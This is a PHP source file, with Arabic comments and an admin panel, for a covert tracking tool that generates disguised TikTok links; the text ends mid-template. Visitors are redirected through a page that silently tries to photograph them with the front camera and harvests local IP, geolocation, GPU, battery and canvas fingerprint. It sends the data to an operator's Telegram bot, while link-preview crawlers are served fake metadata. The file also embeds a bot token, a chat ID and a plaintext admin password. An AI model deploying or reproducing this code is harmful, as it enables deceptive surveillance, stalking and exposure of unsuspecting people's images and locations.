<?php
date_default_timezone_set('Africa/Algiers');
error_reporting(E_ALL);
ini_set('display_errors', 0);

session_start();

$admin_password = 'aziz123'; 
$password_hash = '$2y$10$e.wK1.2Kk7mP8q9Z1x2C3uO5E6a7B8c9D0f1G2h3I4j5K6l7M8n9O0p'; 

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$csrf_token = $_SESSION['csrf_token'];
$login_error = '';

if (isset($_POST['login_password'])) {
    if (password_verify($_POST['login_password'], $password_hash) || $_POST['login_password'] === $admin_password) {
        session_regenerate_id(true);
        $_SESSION['is_logged_in'] = true;
        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
        exit();
    } else {
        $login_error = "كلمة المرور غير صحيحة!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit();
}

$db_file = __DIR__ . '/tracker_enhanced_v3.db';

try {
    $db = new PDO('sqlite:' . $db_file);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    $db->exec("PRAGMA journal_mode=WAL;");
    $db->exec("PRAGMA synchronous=NORMAL;");

    // جدول الروابط
    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        use_camera INTEGER DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    // جدول السجلات
    $db->exec("CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        image_data TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        location TEXT, 
        isp_info TEXT, 
        vpn_status TEXT, 
        device_info TEXT, 
        latitude REAL,
        longitude REAL,
        gpu_info TEXT,
        battery_info TEXT,
        screen_info TEXT,
        canvas_fp TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    // جدول الإعدادات
    $db->exec("CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )");

    // ✅ إدراج وتحديث توكن التلجرام ورقم الـ Chat ID الخاص بك تلقائياً
    $db->prepare("INSERT INTO settings (key, value) VALUES ('tg_token', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value")->execute(['8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU']);
    $db->prepare("INSERT INTO settings (key, value) VALUES ('tg_chat', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value")->execute(['6475721500']);

    // إضافة الأعمدة للنسخ القديمة
    try { $db->exec("ALTER TABLE captures ADD COLUMN gpu_info TEXT"); } catch (Exception $e) {}
    try { $db->exec("ALTER TABLE captures ADD COLUMN battery_info TEXT"); } catch (Exception $e) {}
    try { $db->exec("ALTER TABLE captures ADD COLUMN screen_info TEXT"); } catch (Exception $e) {}
    try { $db->exec("ALTER TABLE captures ADD COLUMN canvas_fp TEXT"); } catch (Exception $e) {}

} catch (Exception $e) {
    die("Database error: " . $e->getMessage());
}

// دالة إرسال إشعار تلجرام
function sendTelegramNotification($db, $message) {
    $stmt = $db->prepare("SELECT value FROM settings WHERE key = 'tg_token'");
    $stmt->execute(); $token = $stmt->fetchColumn();
    
    $stmt = $db->prepare("SELECT value FROM settings WHERE key = 'tg_chat'");
    $stmt->execute(); $chat_id = $stmt->fetchColumn();

    if (empty($token) || empty($chat_id)) return;

    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    curl_exec($ch);
    curl_close($ch);
}

// ✅ الدالة القوية لجلب بيانات تيك توك (3 محاولات)
function fetch_tiktok_exclusive_meta($url) {
    $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'];

    // المحاولة 1: عبر oEmbed API (الطريقة الرسمية)
    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $oembed_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 6); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15');
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        $data = json_decode($response, true);
        if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
            $meta['title'] = $data['title'];
            $meta['image'] = $data['thumbnail_url'];
            return $meta;
        }
    }

    // المحاولة 2: قراءة صفحة الويب مباشرة (تجاوز الحظر)
    $ch_alt = curl_init();
    curl_setopt($ch_alt, CURLOPT_URL, $url);
    curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_alt, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch_alt, CURLOPT_TIMEOUT, 6);
    curl_setopt($ch_alt, CURLOPT_USERAGENT, 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)');
    curl_setopt($ch_alt, CURLOPT_SSL_VERIFYPEER, false);
    $html = curl_exec($ch_alt);
    curl_close($ch_alt);

    if ($html) {
        $dom = new DOMDocument();
        @$dom->loadHTML('<?xml encoding="UTF-8">' . $html);
        $xpath = new DOMXPath($dom);

        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //title');
        if ($titleNodes->length > 0) {
            $val = trim($titleNodes->item(0)->nodeValue);
            if (!empty($val)) $meta['title'] = $val;
        }

        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content');
        if ($imageNodes->length > 0) {
            $val = trim($imageNodes->item(0)->nodeValue);
            if (!empty($val)) $meta['image'] = $val;
        }
    }

    return $meta;
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function get_ip_details($ip) {
    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
        return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
    }
    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,proxy,hosting,lat,lon");
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 3]);
    $json = curl_exec($ch);
    curl_close($ch);

    if ($json) {
        $data = json_decode($json, true);
        if (isset($data['status']) && $data['status'] === 'success') {
            $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
            $isp = $data['isp'] ?? 'Unknown ISP';
            if (stripos($isp, 'Djezzy') !== false || stripos($isp, 'OTA') !== false) $isp = 'Djezzy';
            elseif (stripos($isp, 'Mobilis') !== false || stripos($isp, 'ATM') !== false) $isp = 'Mobilis';
            elseif (stripos($isp, 'Ooredoo') !== false || stripos($isp, 'Wataniya') !== false) $isp = 'Ooredoo';
            elseif (stripos($isp, 'Optimum') !== false) $isp = 'Optimum Telecom';
            elseif (stripos($isp, 'Algerie Telecom') !== false) $isp = 'Algérie Télécom';
            else $isp = implode(' ', array_slice(explode(' ', trim($isp)), 0, 2));

            $vpn = (!empty($data['proxy']) || !empty($data['hosting'])) ? 'Yes (VPN / Proxy)' : 'No (Direct)';
            return ['location' => $location, 'isp' => $isp, 'vpn' => $vpn, 'lat' => $data['lat'] ?? 0, 'lon' => $data['lon'] ?? 0];
        }
    }
    return ['location' => 'Unknown Location', 'isp' => 'Unknown ISP', 'vpn' => 'Unknown', 'lat' => 0, 'lon' => 0];
}

// ✅ تحديث دالة استخراج اسم الهاتف لسحب الموديل الحقيقي
function get_device_type($ua) {
    if (preg_match('/Android\s+[0-9.]+;\s*([^;)]+)/', $ua, $matches)) {
        $model = trim($matches[1]);
        if (stripos($model, 'build') !== false) {
            $model = trim(substr($model, 0, stripos($model, 'build')));
        }
        return $model . ' (Android)';
    }
    if (stripos($ua, 'iPhone') !== false) return 'iPhone (iOS)';
    if (stripos($ua, 'iPad') !== false) return 'iPad (iOS)';
    if (stripos($ua, 'Windows') !== false) return 'PC (Windows)';
    if (stripos($ua, 'Macintosh') !== false) return 'PC (Mac)';
    return 'Unknown Device';
}

// ==========================================
// المتتبع (Zero-Click + Fingerprint + Telegram)
// ==========================================
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch();

    if ($link) {
        $target_redirect = $link['target_url'];
        $meta_title = $link['meta_title'];
        $meta_image = $link['meta_image'];
        $use_camera = $link['use_camera'];

        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);

        if ($is_bot) {
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head>';
            echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
            echo '<meta property="og:type" content="video.other">';
            echo '</head><body></body></html>';
            exit();
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
            $img_base64 = $_POST['image'] ?? '';
            if (strpos($img_base64, 'data:image/') !== 0) $img_base64 = ''; 

            $public_ip = get_real_ip();
            $local_ip = $_POST['lip'] ?? 'Direct';
            $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
            
            $ip_details = get_ip_details($public_ip);
            $device = get_device_type($ua);
            
            $gpu_info = $_POST['gpu'] ?? 'Unknown';
            $battery_info = $_POST['battery'] ?? 'Unknown';
            $screen_info = $_POST['screen'] ?? 'Unknown';
            $canvas_fp = $_POST['canvas_fp'] ?? 'Unknown';

            try {
                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, gpu_info, battery_info, screen_info, canvas_fp, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], $gpu_info, $battery_info, $screen_info, $canvas_fp, date('Y-m-d H:i:s')]);

                // إشعار تلجرام
                $msg = "🚨 <b>زيارة جديدة!</b>\n\n";
                $msg .= "📱 <b>الموديل:</b> {$device}\n";
                $msg .= "🌍 <b>الموقع:</b> {$ip_details['location']}\n";
                $msg .= "📡 <b>الشبكة:</b> {$ip_details['isp']}\n";
                $msg .= "🔗 <b>الآيبي العام:</b> <code>{$public_ip}</code>\n";
                $msg .= "🏠 <b>الآيبي المحلي:</b> <code>{$local_ip}</code>\n";
                $msg .= "🔌 <b>المنفذ:</b> <code>{$port}</code>\n";
                $msg .= "🔋 <b>البطارية:</b> {$battery_info}\n";
                $msg .= "🔑 <b>بصمة Canvas:</b> <code>{$canvas_fp}</code>\n";
                sendTelegramNotification($db, $msg);

            } catch (Exception $e) {}
            exit('OK');
        }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($meta_title); ?></title>
    <style>* { margin: 0; padding: 0; } body, html { width: 100%; height: 100%; background: #000; overflow: hidden; }</style>
    <script>
        const useCamera = <?php echo $use_camera ? 'true' : 'false'; ?>;
        const targetUrl = <?php echo json_encode($target_redirect); ?>;

        function getScreenInfo() { return `${window.screen.width}x${window.screen.height} @ ${window.devicePixelRatio}x`; }

        function getGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch (e) { return 'Unknown'; }
        }

        async function getBatteryInfo() {
            try {
                const battery = await navigator.getBattery();
                return Math.round(battery.level * 100) + "%";
            } catch (e) { return 'Unknown'; }
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15);
                const data = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < data.length; i++) {
                    const char = data.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash = hash & hash;
                }
                return Math.abs(hash).toString(16).substring(0, 16);
            } catch (e) { return 'Unknown'; }
        }

        function getLocalIP() {
            return new Promise((resolve) => {
                let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                let resolved = false;
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                pc.onicecandidate = (e) => {
                    if (!e.candidate || !e.candidate.candidate) return;
                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (ip && !ip[1].endsWith('.local') && !resolved) {
                        resolved = true;
                        resolve(ip[1]);
                        pc.close();
                    }
                };
                setTimeout(() => { if(!resolved) { resolve("Direct"); pc.close(); } }, 300); 
            });
        }

        async function initTracking() {
            let imageData = "";
            if (useCamera) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(r => setTimeout(r, 200)); 
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = 480; canvas.height = 360; 
                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 360);
                    imageData = canvas.toDataURL('image/jpeg', 0.5); 
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {}
            }

            const localIp = await getLocalIP();
            const gpu = getGPUInfo();
            const screen = getScreenInfo();
            const battery = await getBatteryInfo();
            const canvasFp = getCanvasFingerprint();
            
            const formData = new URLSearchParams();
            formData.append('save_info', '1');
            formData.append('image', imageData);
            formData.append('lip', localIp);
            formData.append('gpu', gpu);
            formData.append('screen', screen);
            formData.append('battery', battery);
            formData.append('canvas_fp', canvasFp);

            if (navigator.sendBeacon) {
                navigator.sendBeacon(window.location.href, formData);
                window.location.replace(targetUrl);
            } else {
                fetch(window.location.href, { method: 'POST', body: formData, keepalive: true }).finally(() => {
                    window.location.replace(targetUrl);
                });
            }
        }

        window.addEventListener('DOMContentLoaded', initTracking);
    </script>
</head>
<body></body>
</html>
<?php 
        exit();
    } else {
        die("Link not found.");
    }
}

// ==========================================
// لوحة التحكم (Admin)
// ==========================================
if (isset($_GET['delete_id']) && isset($_SESSION['is_logged_in'])) {
    $db->prepare("DELETE FROM captures WHERE id = ?")->execute([intval($_GET['delete_id'])]);
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit();
}

$generated_link = ""; $generated_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create']) && isset($_SESSION['is_logged_in'])) {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) die("CSRF Failed.");
    $target_url = trim($_POST['target_url']);
    $use_camera = isset($_POST['use_camera']) ? 1 : 0;
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) $target_url = "https://" . $target_url;

    $scraped = fetch_tiktok_exclusive_meta($target_url);
    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?)")->execute([$code, $target_url, $scraped['title'], $scraped['image'], $use_camera]);

    $generated_link = "https://" . $_SERVER['HTTP_HOST'] . "/?r=" . $code;
    $generated_code = $code;
}

$total_links = $db->query("SELECT COUNT(*) FROM links")->fetchColumn();
$total_captures = $db->query("SELECT COUNT(*) FROM captures")->fetchColumn();
$today_captures = $db->query("SELECT COUNT(*) FROM captures WHERE date(created_at) = date('now')")->fetchColumn();

$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
} else {
    $stmt = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30");
}
$captures = $stmt->fetchAll();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel - V10.1</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        :root { --bg: #070913; --card: #10172a; --border: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #8b5cf6; --danger: #f43f5e; --success: #10b981; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, sans-serif; }
        @keyframes bg { 0%,100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
        body { background: linear-gradient(-45deg, #070913, #1e1b4b, #0f172a, #090d16); background-size: 400% 400%; animation: bg 15s ease infinite; color: var(--text); padding: 40px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
        .wrapper { max-width: 1200px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; }
        .stat-card { background: rgba(16, 23, 42, 0.85); border: 1px solid var(--border); border-radius: 12px; padding: 20px; text-align: center; transition: 0.3s; position: relative; }
        .stat-card:hover { transform: translateY(-5px); border-color: var(--accent); box-shadow: 0 10px 20px -5px rgba(139, 92, 246, 0.4); }
        .stat-card h3 { font-size: 12px; color: var(--muted); text-transform: uppercase; margin-bottom: 10px; }
        .stat-card p { font-size: 28px; font-weight: 800; background: linear-gradient(to right, #a78bfa, #38bdf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .stat-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: var(--accent); }
        .live-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(16, 185, 129, 0.1); color: var(--success); padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; border: 1px solid rgba(16, 185, 129, 0.3); }
        .live-dot { width: 8px; height: 8px; background: var(--success); border-radius: 50%; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); } 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); } }
        .section-box { background: rgba(16, 23, 42, 0.85); border: 1px solid var(--border); border-radius: 16px; padding: 30px; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); }
        h1 { text-align: center; font-size: 26px; font-weight: 800; margin-bottom: 5px; background: linear-gradient(to right, #a78bfa, #38bdf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
        .subtitle { color: var(--muted); font-size: 13px; }
        h2 { font-size: 13px; font-weight: 700; text-transform: uppercase; color: var(--accent); margin-bottom: 16px; border-bottom: 1px solid var(--border); padding-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
        .form-grid { display: grid; gap: 16px; }
        input[type="text"], input[type="password"] { width: 100%; background: #050b14; border: 1px solid var(--border); border-radius: 10px; padding: 14px 16px; color: var(--text); outline: none; transition: 0.2s; }
        input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15); }
        .checkbox-container { display: flex; align-items: center; gap: 10px; cursor: pointer; font-size: 14px; color: var(--muted); }
        .checkbox-container input { width: 18px; height: 18px; accent-color: var(--accent); cursor: pointer; }
        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 10px; font-weight: 600; cursor: pointer; height: 48px; display: inline-flex; align-items: center; justify-content: center; text-decoration: none; transition: 0.2s; position: relative; overflow: hidden; }
        .btn:hover { background: #7c3aed; transform: translateY(-2px); box-shadow: 0 10px 15px -3px rgba(139, 92, 246, 0.4); }
        .btn-danger { background: var(--danger); } .btn-danger:hover { background: #e11d48; }
        .btn-secondary { background: #334155; } .btn-secondary:hover { background: #475569; }
        .btn-success { background: var(--success); } .btn-success:hover { background: #059669; }
        .result-panel { background: #050b14; border: 1px solid var(--border); padding: 18px; border-radius: 12px; margin-top: 15px; display: grid; gap: 12px; }
        .result-panel label { display: block; font-size: 11px; font-weight: 700; color: var(--accent); text-transform: uppercase; }
        .flex-row { display: flex; gap: 8px; }
        .input-link-result { background: #0b1329 !important; color: #38bdf8 !important; font-weight: 600; }
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 16px; margin-top: 15px; }
        .card-img { background: #050b14; border: 1px solid var(--border); border-radius: 12px; padding: 14px; display: flex; flex-direction: column; transition: 0.3s; }
        .card-img:hover { transform: translateY(-5px) scale(1.02); border-color: var(--accent); box-shadow: 0 15px 25px -5px rgba(139, 92, 246, 0.3); }
        .card-img img { width: 100%; height: 180px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border); }
        .map-container { height: 140px; width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid var(--border); z-index: 1; }
        .leaflet-control-attribution { display: none !important; }
        .info-row { display: flex; justify-content: space-between; font-size: 12px; margin-top: 6px; color: var(--muted); }
        .info-row span { color: #cbd5e1; }
        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; cursor: pointer; }
        .code-badge:hover { color: #38bdf8; }
        .btn-delete { display: block; width: 100%; margin-top: auto; background: rgba(244, 63, 94, 0.1); color: var(--danger); border: 1px solid rgba(244, 63, 94, 0.3); border-radius: 8px; padding: 8px; font-size: 12px; font-weight: 600; text-align: center; text-decoration: none; margin-top: 12px; }
        .btn-delete:hover { background: var(--danger); color: white; }
        footer { text-align: center; margin-top: 30px; font-size: 11px; color: var(--muted); border-top: 1px solid var(--border); padding-top: 20px; }
        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(100px); background: var(--success); color: white; padding: 12px 24px; border-radius: 8px; font-weight: bold; transition: 0.3s; z-index: 9999; opacity: 0; }
        .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
    </style>
    <script>
        function copyText(text, btn) {
            navigator.clipboard.writeText(text).then(() => {
                const t = document.getElementById('toast');
                t.classList.add('show');
                setTimeout(() => t.classList.remove('show'), 2000);
                if(btn) {
                    const o = btn.innerText; btn.innerText = "Copied!"; btn.style.background = "#10b981";
                    setTimeout(() => { btn.innerText = o; btn.style.background = ""; }, 2000);
                }
            });
        }
        async function pasteCodeToFilter(btn) {
            try {
                const text = await navigator.clipboard.readText();
                document.getElementById('trackCodeInput').value = text.trim();
                const o = btn.innerText; btn.innerText = "Pasted"; btn.style.background = "#059669";
                setTimeout(() => { btn.innerText = o; btn.style.background = ""; }, 2000);
            } catch (err) { alert('يرجى السماح بالوصول للحافظة.'); }
        }
        function updateClock() { document.getElementById('live-clock').innerText = new Date().toLocaleTimeString('en-GB'); }
        setInterval(updateClock, 1000); updateClock();
        function showLoading(btn) { btn.innerHTML = ''; btn.classList.add('btn-loading'); btn.style.pointerEvents = 'none'; }
    </script>
</head>
<body>
    <div class="wrapper">
        <div class="header-flex">
            <div>
                <h1>Control Panel</h1>
                <p class="subtitle">Zero-Click Engine V10.1 (Fixed Meta)</p>
            </div>
            <div style="text-align: left;">
                <div class="live-badge"><div class="live-dot"></div> SYSTEM ONLINE</div>
                <div style="font-size: 20px; font-weight: bold; font-family: monospace; margin-top: 5px; color: #38bdf8;" id="live-clock">00:00:00</div>
            </div>
        </div>

        <?php if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true): ?>
            <div class="section-box" style="max-width: 400px; margin: 50px auto; width: 100%;">
                <h2>تسجيل الدخول</h2>
                <?php if (!empty($login_error)): ?><p style="color: var(--danger); font-size: 12px; margin-bottom: 12px; text-align: center;"><?php echo $login_error; ?></p><?php endif; ?>
                <form method="POST" class="form-grid">
                    <input type="password" name="login_password" placeholder="أدخل كلمة المرور..." required autofocus>
                    <button type="submit" class="btn" style="width: 100%;">دخول</button>
                </form>
            </div>
        <?php else: ?>
            <div class="stats-grid">
                <div class="stat-card"><h3>Total Links</h3><p><?php echo $total_links; ?></p></div>
                <div class="stat-card"><h3>Total Captures</h3><p><?php echo $total_captures; ?></p></div>
                <div class="stat-card"><h3>Today's Captures</h3><p style="color: #10b981; -webkit-text-fill-color: #10b981;"><?php echo $today_captures; ?></p></div>
            </div>
            <div style="text-align: right; margin-bottom: -10px;"><a href="?logout=1" class="btn btn-danger" style="height: 38px; padding: 0 16px; font-size: 12px;">تسجيل الخروج</a></div>

            <div class="section-box">
                <h2>Generate TikTok Link</h2>
                <form method="POST" class="form-grid" onsubmit="showLoading(this.querySelector('button[type=submit]'))">
                    <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                    <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
                    <label class="checkbox-container"><input type="checkbox" name="use_camera" value="1" checked> تفعيل التقاط صورة الكاميرا عند الزيارة (اختياري)</label>
                    <button type="submit" name="create" class="btn">Generate Link</button>
                </form>
                <?php if (!empty($generated_link)): ?>
                    <div class="result-panel">
                        <div><label>Active Link:</label><div class="flex-row" style="margin-top: 6px;"><input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_link); ?>"><button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_link)); ?>', this)">Copy</button></div></div>
                        <div><label>Tracking Code:</label><div class="flex-row" style="margin-top: 6px;"><input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_code); ?>" style="font-family: monospace; font-weight: bold; color: #a78bfa !important;"><button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_code)); ?>', this)">Copy Code</button></div></div>
                    </div>
                <?php endif; ?>
            </div>

            <div class="section-box">
                <h2><span>Captured Gallery & Details</span><a href="/" class="btn btn-secondary" style="height: 28px; padding: 0 12px; font-size: 11px;">🔄 Refresh</a></h2>
                <form method="GET" style="margin-bottom: 20px; display: flex; gap: 8px; flex-wrap: wrap;">
                    <input type="text" id="trackCodeInput" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; min-width: 200px;">
                    <div style="display: flex; gap: 8px;">
                        <button type="submit" class="btn" style="height:48px;">Filter</button>
                        <button type="button" class="btn btn-success" style="height:48px;" onclick="pasteCodeToFilter(this)">Paste</button>
                        <?php if(!empty($filter_code)): ?><a href="/" class="btn btn-danger" style="height:48px; display:flex; align-items:center;">Reset</a><?php endif; ?>
                    </div>
                </form>

                <?php if (empty($captures)): ?>
                    <p style="text-align: center; color: var(--muted); padding: 40px;">No captures recorded.</p>
                <?php else: ?>
                    <div class="gallery-grid">
                        <?php foreach ($captures as $cap): ?>
                            <div class="card-img">
                                <?php if (!empty($cap['image_data'])): ?>
                                    <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank"><img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture"></a>
                                <?php else: ?>
                                    <div style="width: 100%; height: 180px; background: #0b1329; display: flex; align-items: center; justify-content: center; border-radius: 8px; color: var(--muted); font-size: 12px; border: 1px dashed var(--border);">الكاميرا معطلة (بدون صورة)</div>
                                <?php endif; ?>

                                <?php if (!empty($cap['latitude']) && !empty($cap['longitude'])): ?>
                                    <div id="map-<?php echo $cap['id']; ?>" class="map-container"></div>
                                    <script>
                                        document.addEventListener("DOMContentLoaded", function() {
                                            var map = L.map('map-<?php echo $cap['id']; ?>', { zoomControl: false, attributionControl: false }).setView([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], 10);
                                            L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', { maxZoom: 16 }).addTo(map);
                                            L.circleMarker([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], { color: '#8b5cf6', fillColor: '#8b5cf6', fillOpacity: 0.8, radius: 8 }).addTo(map).bindPopup("<b><?php echo htmlspecialchars($cap['public_ip']); ?></b>");
                                        });
                                    </script>
                                <?php endif; ?>

